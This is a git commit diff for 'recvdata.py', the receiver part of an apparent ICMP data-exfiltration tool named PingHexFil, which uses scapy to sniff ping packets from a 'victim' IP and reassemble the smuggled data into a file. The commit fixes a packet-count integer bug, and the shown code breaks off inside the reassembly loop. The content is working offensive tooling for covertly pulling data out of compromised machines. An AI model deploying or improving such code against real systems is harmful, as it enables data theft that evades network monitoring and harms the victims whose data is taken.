72e4902fe6defdbff141cb76f662c1bd040c19e7
WeakNetLabs <weaknetlabs@gmail.com>
2019-05-15 15:26:19 -0400

    Fixed integer bug

--- recvdata.py
+++ recvdata.py
@@ -1,24 +1,25 @@
 #!/usr/bin/python
 # recieve the exfiltrated data via ICMP
 #
-import sys
+from sys import argv
 from scapy.all import sniff
 
 def usage():
     print "\n PingHexFil - Receiver\n 2019 WeakNetLabs\n Usage: ./recvdata.py (OUTPUT FILE) (VICTIM IP) (COUNT)\n"
     exit(1)
 
-if (len(sys.argv)!=4):
+if (len(argv)!=4):
     usage()
 
-fileName=sys.argv[1]
-victimIP=sys.argv[2]
-count=sys.argv[3]
+fileName=argv[1]
+victimIP=argv[2]
+packetCount=argv[3]
 
 print "[+] Waiting for data from: "+victimIP
 print "[+] Writing to file: "+fileName
+print "[+] Packet count: "+packetCount
 print "[+] Begin exfiltration script on victim now ..."
-data=sniff(filter="icmp and host "+victimIP,count=count)
+data=sniff(filter="icmp and host "+victimIP,count=int(packetCount))
 token=0
 fileData="" # placeholder for the string of data
 for packet in data: # loop through packets and concatenate the data
